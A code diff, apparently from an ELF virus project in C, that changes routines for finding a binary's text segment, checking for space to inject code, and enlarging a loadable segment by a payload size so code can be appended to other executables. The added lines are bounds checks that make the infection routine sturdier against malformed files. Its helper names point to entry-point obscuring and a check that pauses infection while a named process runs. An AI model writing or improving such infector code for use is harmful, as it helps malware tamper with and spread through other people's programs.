@@ -92,12 +92,16 @@ int		find_text(t_info *info)
 	base_entry = main_header->e_entry;
 	i = 0;
 	header = (Elf64_Phdr *)(info->file + sizeof(Elf64_Ehdr));
+	if (info->file_size < main_header->e_shoff + (main_header->e_shnum * sizeof(Elf64_Shdr)))
+		return (1);
 	while (i < main_header->e_phnum)
 	{
 		if ((header->p_type == PT_LOAD) && (base_entry > header->p_vaddr) && (base_entry < header->p_vaddr + header->p_memsz))
 		{
 			info->text_begin = header->p_offset + info->file;
 			info->text_size = header->p_filesz;
+			if (info->text_begin + info->text_size > info->file + info->file_size)
+				return (1);
 			if (check_magic(info) == 1)
 				return (1);
 			if (get_padding_size(info, header, main_header->e_phnum) < INJECT_SIZE)
@@ -172,9 +176,14 @@ void		epo_parsing(t_info *info)
 	}
 }
 
-void		pe_parsing(t_info *info)
+int			pe_parsing(t_info *info)
 {
 	Elf64_Phdr	*program_header;
+	Elf64_Ehdr	*main_header;
+
+	main_header = (Elf64_Ehdr *)(info->file);
+	if (info->file_size < sizeof(Elf64_Ehdr) + (main_header->e_phnum * sizeof(Elf64_Phdr)))
+		return (1);
 
 	program_header = (Elf64_Phdr *)(info->file + sizeof(Elf64_Ehdr));
 	while (program_header->p_type != PT_LOAD)
@@ -187,8 +196,11 @@ void		pe_parsing(t_info *info)
 	info->addr_payload = program_header->p_vaddr + program_header->p_memsz;
 	info->bss_size = program_header->p_memsz - program_header->p_filesz;
 	info->begin_bss = program_header->p_offset + program_header->p_filesz;
+	if (info->begin_bss > info->file_size)
+		return (1);
 	program_header->p_memsz += PAYLOAD_SIZE;
 	program_header->p_filesz = program_header->p_memsz;
+	return (0);
 }
 
 static int	parse_process(char *path, int pid_len, char *buf_inhibitor)
